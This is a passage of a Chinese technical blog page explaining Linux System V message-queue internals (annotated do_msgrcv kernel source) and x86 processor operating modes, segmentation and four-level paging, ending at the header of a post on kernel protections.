<li>检查 msg_queue 后，对将要被发送的数据进行处理：<ul>
<li>如果有被阻塞的接收进程，则将消息直接发送给被阻塞的接收进程</li>
<li>否则，将消息排入消息队列尾</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>从消息队列中读取消息 <code>msgrcv</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee2f68</span> &lt;msgrcv+<span class="number">24</span>&gt;    syscall  &lt;SYS_msgrcv&gt;</span><br><span class="line">       msqid: <span class="number">0x16</span></span><br><span class="line">       msgp: <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line">       msgsz: <span class="number">0x80</span></span><br><span class="line">       msgtyp: <span class="number">0x3e7</span></span><br><span class="line">       msgflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户态的底层还是一个 syscall</li>
<li>内核态中就是以下这个函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax)); <span class="comment">/* 调用&quot;load_msg(buf, bufsz)&quot;,生成msg_msg为copy做准备 */</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid); <span class="comment">/* 通过msqid从namespace中找到对应的msq-&gt;q_perm结构体,然后调用container_of通过偏移计算得到msg_queue结构体地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span> <span class="comment">/* 定义了接收消息链表 */</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode); <span class="comment">/* 查找可用的msg */</span></span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy); <span class="comment">/* MSG_COPY:将message拷贝一份后再拷贝到用户空间 */</span></span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list); <span class="comment">/* 把已经接收过数据的msg脱链 */</span></span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123; <span class="comment">/* IPC_NOWAIT:如果没有符合条件的msg则立即返回 */</span> </span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers); <span class="comment">/* 插入msg_msg链表尾 */</span></span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line">		msr_d.r_msg = ERR_PTR(-EAGAIN);</span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg); <span class="comment">/* 读出msg变量 */</span></span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = msr_d.r_msg;</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list); </span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123; <span class="comment">/* 仅仅检查一下是否有信号,不处理信号 */</span></span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz); <span class="comment">/* 这里的msg_handler就是do_msg_fill */</span></span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里总结一下 <code>do_msgrcv</code> 的功能：<ul>
<li>调用 <code>prepare_copy</code> 为后面的复制做准备（在底层还是调用 <code>load_msg</code> 创建一个 msg_msg 结构体，再把数据拷贝到该 msg_msg 的后面）</li>
<li>通过 msqid 计算得到 msg_queue 结构体地址</li>
<li>调用 <code>find_msg</code> 查找可用的 msg_msg 结构体（这些 msg_msg 都是 <code>msgsnd</code> 发送出来的）</li>
<li>调用 <code>do_msg_fill-&gt;store_msg-&gt;copy_to_user</code> 把 msg_msg 中的内容传输到用户态</li>
</ul>
</li>
</ul>
<p><strong>msg VS Pipe</strong></p>
<p>同样是进程间的通信，那么消息队列与管道相较而言有哪些优势和劣势：</p>
<ul>
<li>优点：<ul>
<li>消息队列收发消息自动保证了同步，不需要由进程自己来提供同步方法，而命名管道需要自行处理同步问题</li>
<li>消息队列接收数据可以根据消息类型有选择的接收特定类型的数据，不需要像命名管道一样默认接收数据</li>
</ul>
</li>
<li>缺点： <ul>
<li>发送和接受的每个数据都有最大的长度限制</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">x86-32&64处理器的几种运行模式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-17 22:43:29" itemprop="dateCreated datePublished" datetime="2022-09-17T22:43:29+08:00">2022-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-02 21:51:06" itemprop="dateModified" datetime="2022-10-02T21:51:06+08:00">2022-10-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="x86-32"><a href="#x86-32" class="headerlink" title="x86-32"></a>x86-32</h2><p>在32位时代，x86 的 operating mode 有3种：</p>
<ul>
<li>实模式（Real Mode）</li>
<li>保护模式（Protected Mode）</li>
<li>虚拟8086模式（Virtual 8086 Mode） </li>
</ul>
<p><strong>实模式（Real Mode）</strong></p>
<p>8086的CPU是16位的，为其可以索引更大的内存地址空间，内核采用了分段机制（shift-and-add segmentation）</p>
<ul>
<li>即一个逻辑地址由 segment 加上 offset 组成</li>
</ul>
<p>基于分段机制（shift-and-add segmentation）的寻址过程：</p>
<ul>
<li>获取对应的段寄存器</li>
<li>通过公式 <code>linear address = segment &lt;&lt; 4 + offset</code> 计算逻辑地址</li>
</ul>
<p><strong>保护模式（Protected Mode）</strong></p>
<p>80286 的CPU是32位的（寻址范围为4G），它也使用分段机制（table-based segmentation）</p>
<ul>
<li>但它的段寄存器 segment register 存的不再是 segment 的起始地址，而是一个段选择子 segment selector</li>
<li>通过这个 segment selector 查找全局标识符表GDT表获得段描述符 segment descriptor</li>
<li>segment descriptor 存的才是 segment 的起始地址 </li>
</ul>
<p>段寄存器 segment register 中存放的就是16位的数据结构-段选择子</p>
<p>段选择子 segment selector 的结构如下：</p>
<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663378590133-1664718664746.png" class width="1663378590133"> 
<ul>
<li>Index：CPU 将索引号乘8再加上GDT或者LDT的基地址，就可以找到目标段描述符</li>
<li>TL：其值为“0”查找 GDT 表，其值为“1”查找 LDT 表</li>
<li>RPL：请求特权级别（可以用于判断当前代码是否处于内核态）</li>
</ul>
<p>在保护模式下，对一个段的描述则包括3方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个64-bit长的数据结构中，被称为段描述符</p>
<p>段描述符 segment descriptor 的结构如下：</p>
<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663377315062-1664718664747.png" class width="1663377315062"> 
<ul>
<li><strong>G</strong> - Granularity 粒度（byte 或者 page），因为段的最大长度 limit 占20位<ul>
<li>如果粒度为 byte，则该 segment 的寻址范围是 1MB</li>
<li>如果粒度为 page-4KB，则该 segment 的寻址范围是 4GB</li>
<li>一个 segment 的 size 是由 limit 和G位共同确定的</li>
</ul>
</li>
<li><strong>D/B</strong> - Default Size/Bound<ul>
<li>为“1”表示在32位模式下运行</li>
<li>为“0”在16位模式下运行</li>
</ul>
</li>
<li><strong>L</strong> - 仅在64位系统中有效<ul>
<li>为“1”表示在64位长模式下运行（64-Bit Mode）</li>
<li>为“0”表示在64位兼容模式下运行（Compatibility Mode）</li>
</ul>
</li>
<li><strong>AVL</strong> - Available for software，留给软件用的，但在 linux 里是被忽略的</li>
<li><strong>P</strong> - Present，用于指明表项对地址转换是否有效<ul>
<li>P = 1：表示有效</li>
<li>P = 0：表示无效</li>
<li>在页转换过程中，如果说涉及的页目录或页表的表项无效，则会导致一个异常</li>
</ul>
</li>
<li><strong>DPL</strong> - Descriptor Privledge Level，表示可以访问 segment 的最低级别<ul>
<li>x86处理器的特权级别从 <code>ring 0</code> 到 <code>ring 3</code>，数字越小，级别越高</li>
<li>通常用户空间运行于 <code>ring3</code>，内核空间运行于 <code>ring0</code></li>
<li>假设 DPL 为“1”，则只有当前特权级别为“0”或者“1”时，才可以访问该 decriptor 指向的 segment</li>
</ul>
</li>
<li><strong>Type</strong> - 目标段拥有的权限<ul>
<li>对于 task segment 是没有意义的</li>
<li>对于 code segment 和 data segment 主要是关于 Writable，Executable 的属性</li>
</ul>
</li>
<li><strong>Base Address</strong> - 基地址</li>
</ul>
<p>基于分段机制（table-based segmentation）的寻址过程：</p>
<ul>
<li>内核提供了一个寄存器GDTR用来存放GDT的入口地址</li>
<li>通过段选择子 segment selector 找到对应 GDT 条目-段描述符 segment descriptor</li>
<li>通过段描述符 segment descriptor 找到基地址</li>
</ul>
<p>GDT&amp;LDT 的使用条件：</p>
<ul>
<li>GDT 能完成被多个任务共享的内存区</li>
<li>LDT 通常情况下是与任务的数量保持对等（LDT放在GDT中）</li>
</ul>
<p><strong>虚拟8086模式（Virtual 8086 Mode） </strong></p>
<p>利用一种硬件虚拟化技术，在i386的芯片上模拟出多个8086芯片</p>
<p>当处理器进入保护模式后，基于实模式的应用就不能直接运行了，采用虚拟8086模式，则可以让这些实模式的应用运行在基于保护模式的操作系统上，因此这种模式也被称为 Virtual Real Mode</p>
<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><p>进入64位的x64处理器时代后（64位CPU的寻址已经不会受到限制，可以不使用分段机制），产生了一种新的运行模式，叫 Long Mode，传统的三种模式则被统称为传统模式（Legacy Mode）</p>
<p>Long Mode 又分为2种子模式：</p>
<ul>
<li>64位长模式（64-Bit Mode）：应用程序必须也得是64位的 </li>
<li>64位兼容模式（Compatibility Mode）：32位应用程序也可以运行</li>
</ul>
<p>置位 EFER 寄存器的 LME 位可以开启 Long Mode</p>
<ul>
<li>由于 Long Mode 要求 paging 必须开启，所以在进入 Long Mode 之前，还需要置位CR0寄存器的PG位</li>
<li>置位 code segment 的L位可在 64-Bit Mode 和 Compatibility Mode 之间切换</li>
</ul>
<p><strong>四级分页机制</strong></p>
<p>如果不开启分页机制，那么线性地址就等同于物理地址，这要求物理地址必须是连续的</p>
<p>前面我们提到 Linux 内核仅使用了较少的分段机制，但是却对分页机制的依赖性很强，其使用一种适合32位和64位结构的通用分页模型，该模型使用四级分页机制：</p>
<ul>
<li>页全局目录（Page Global Directory）</li>
<li>页上级目录（Page Upper Directory）</li>
<li>页中间目录（Page Middle Directory）</li>
<li>页表（Page Table）</li>
</ul>
<p>因此线性地址因此被分成五个部分，通过各个部分索引到对应的表，而每一部分的大小与具体的计算机体系结构有关</p>
<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663424435610-1664718664747.png" class width="1663424435610"> 
<p>相关结构类型：</p>
<ul>
<li>Linux 分别采用 <code>pgd_t pmd_t pud_t pte_t</code> 四种数据结构来表示页全局目录项、页上级目录项、页中间目录项和页表项（这四种数据结构本质上都是无符号长整型 unsigned long）</li>
</ul>
<p>PAGE - 页表 (Page Table)：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>PAGE_SHIFT</td>
<td>指定Offset字段的位数</td>
</tr>
<tr>
<td>PAGE_SIZE</td>
<td>页的大小</td>
</tr>
<tr>
<td>PAGE_MASK</td>
<td>用以屏蔽Offset字段的所有位</td>
</tr>
</tbody>
</table>
</div>
<p>PMD - 页目录 (Page Middle Directory)：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>PMD_SHIFT</td>
<td>指定线性地址的Offset和Table字段的总位数，换句话说，是页中间目录项可以映射的区域大小的对数</td>
</tr>
<tr>
<td>PMD_SIZE</td>
<td>用于计算由页中间目录的一个单独表项所映射的区域大小，也就是一个页表的大小</td>
</tr>
<tr>
<td>PMD_MASK</td>
<td>用于屏蔽Offset字段与Table字段的所有位</td>
</tr>
</tbody>
</table>
</div>
<p>PUD_SHIFT - 页上级目录 (Page Upper Directory)：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>PUD_SHIFT</td>
<td>确定页上级目录项能映射的区域大小的位数</td>
</tr>
<tr>
<td>PUD_SIZE</td>
<td>用于计算页全局目录中的一个单独表项所能映射的区域大小</td>
</tr>
<tr>
<td>PUD_MASK</td>
<td>用于屏蔽Offset字段，Table字段，Middle Air字段和Upper Air字段的所有位</td>
</tr>
</tbody>
</table>
</div>
<p>PGDIR_SHIFT - 页全局目录 (Page Global Directory)：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>PGDIR_SHIFT</td>
<td>确定页全局页目录项能映射的区域大小的位数</td>
</tr>
<tr>
<td>PGDIR_SIZE</td>
<td>用于计算页全局目录中一个单独表项所能映射区域的大小</td>
</tr>
<tr>
<td>PGDIR_MASK</td>
<td>用于屏蔽Offset, Table，Middle Air及Upper Air的所有位</td>
</tr>
</tbody>
</table>
</div>
<p>基于分页机制（paging）的寻址过程：</p>
<ul>
<li>从CR3寄存器中读取页目录所在物理页面的基址（即所谓的页目录基址），从线性地址的第一部分获取页目录项的索引，两者相加得到页目录项的物理地址</li>
<li>第一次读取内存得到 pgd_t 结构的目录项，从中取出物理页基址取出（具体位数与平台相关，如果是32系统，则为20位），即页上级页目录的物理基地址</li>
<li>从线性地址的第二部分中取出页上级目录项的索引，与页上级目录基地址相加得到页上级目录项的物理地址</li>
<li>第二次读取内存得到 pud_t 结构的目录项，从中取出页中间目录的物理基地址</li>
<li>从线性地址的第三部分中取出页中间目录项的索引，与页中间目录基址相加得到页中间目录项的物理地址</li>
<li>第三次读取内存得到 pmd_t 结构的目录项，从中取出页表的物理基地址</li>
<li>从线性地址的第四部分中取出页表项的索引，与页表基址相加得到页表项的物理地址</li>
<li>第四次读取内存得到 pte_t 结构的目录项，从中取出物理页的基地址</li>
<li>从线性地址的第五部分中取出物理页内偏移量，与物理页基址相加得到最终的物理地址</li>
<li>第五次读取内存得到最终要访问的数据</li>
</ul>
<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663425389920-1664718664747.png" class width="1663425389920"> 
<ul>
<li>程序的线性地址将作为各级页表索引</li>
<li>因此内核会给用户程序提供一个抽象：虚拟地址</li>
<li>虚拟地址到线性地址的转换则依靠分段机制</li>
</ul>
<p><strong>其他差异</strong></p>
<p>在 Legay Mode 中，用户空间可通过 SYSENTER 指令进入内核空间，内核空间则通过 SYSEXIT 指令返回用户空间，在此过程中，由于发生了 segment 切换，所以需要进行 segmentation 的各种检测，比较影响效率</p>
<p>在 Long Mode 中，伴随着 segmentation 的弱化和 flat momery model（平坦内存模型）的使用，SYSENTER/SYSEXIT 这2个指令不再被支持，取而代之的不需要 segmentation 检测的 SYSCALL 和 SYSRET 指令</p>
<p>此外，Legacy Mode 还提供了一种叫 task-state segment (TSS) 的硬件机制，可以在发生 task switch 时，自动保存 task 的状态信息，可理解为硬件辅助的进程切换，由于主流操作系统很少用到这一机制，在 Long Mode 中已经不再支持 TSS</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/14/kernel%20protect/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/14/kernel%20protect/" class="post-title-link" itemprop="url">kernel protect</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-14 14:58:30" itemprop="dateCreated datePublished" datetime="2022-09-14T14:58:30+08:00">2022-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:34:18" itemprop="dateModified" datetime="2022-12-09T18:34:18+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
